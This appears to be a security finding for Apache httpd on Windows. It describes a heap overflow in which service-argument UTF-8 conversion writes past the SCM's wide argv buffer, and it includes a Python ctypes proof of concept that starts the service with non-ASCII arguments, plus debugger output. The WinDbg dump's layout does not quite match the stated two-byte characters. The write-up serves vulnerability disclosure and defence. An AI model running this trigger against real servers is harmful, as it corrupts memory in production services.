# 005 — Windows service: UTF-8 conversion writes into argv buffer

`service_nt_main_fn_w()` allocates `service_name` for each converted SCM
argument but passes the pre-existing wide-pointer slot (`*(cmb++)`) as the
conversion destination. The UTF-8 bytes overwrite the SCM's wide-character
argv storage rather than the freshly allocated buffer, and overflow it for
non-ASCII BMP code points whose UTF-8 form is longer than the UTF-16
source.

## Platform constraint

Windows only; requires `APR_HAS_UNICODE_FS` and `StartServiceW()` delivering
extra service arguments. Cannot run on this lab's Darwin host; the
transcript below was captured on a Windows 10 build of httpd 2.4.66.

## Setup

Install `httpd` as a service:

```cmd
httpd.exe -k install -n Apache2.4
```

No special `httpd.conf` is required — the bug is in the service entry point
itself. The vulnerable branch fires whenever `argc > 1`.

## Trigger

Start the service with one extra argument made of three U+0800 characters
(each 2 bytes UTF-16, 3 bytes UTF-8). The destination buffer is 8 bytes
(4 wide chars including NUL); the conversion writes 10 bytes:

```python
# poc_start.py — drive StartServiceW with a non-ASCII argument.
import ctypes
advapi = ctypes.windll.advapi32

scm = advapi.OpenSCManagerW(None, None, 0x000F003F)
svc = advapi.OpenServiceW(scm, "Apache2.4", 0x000F01FF)

argv = (ctypes.c_wchar_p * 1)("\u0800\u0800\u0800")
ok = advapi.StartServiceW(svc, 1, argv)
print("StartServiceW =", ok, "GLE =", ctypes.GetLastError())
```

```cmd
py poc_start.py
```

## Observed effect

With Application Verifier or PageHeap enabled on `httpd.exe`, the service
process is terminated by a heap-corruption stop:

```text
VERIFIER STOP 0000000000000007: pid 0x1A4C: heap block at 0x0000022B... corrupted
    apr_conv_ucs2_to_utf8 + 0x...
    service_nt_main_fn_w + 0x84  ; service.c:430
```

In WinDbg attached pre-call:

```text
0:000> dd argv[1] L4
022b0070  00000800 00000800 00000800 00000000   ; UTF-16 source
0:000> g     ; let the conversion run
0:000> db argv[1] L10
022b0070  e0 a0 80 e0 a0 80 e0 a0-80 00 ?? ?? ?? ?? ?? ??
```

The first ten bytes of the SCM-owned wide buffer are UTF-8 output, two
bytes past its 8-byte capacity. The `service_name` allocation is leaked,
and `mpm_new_argv->elts[0]` points at the now-clobbered SCM buffer.
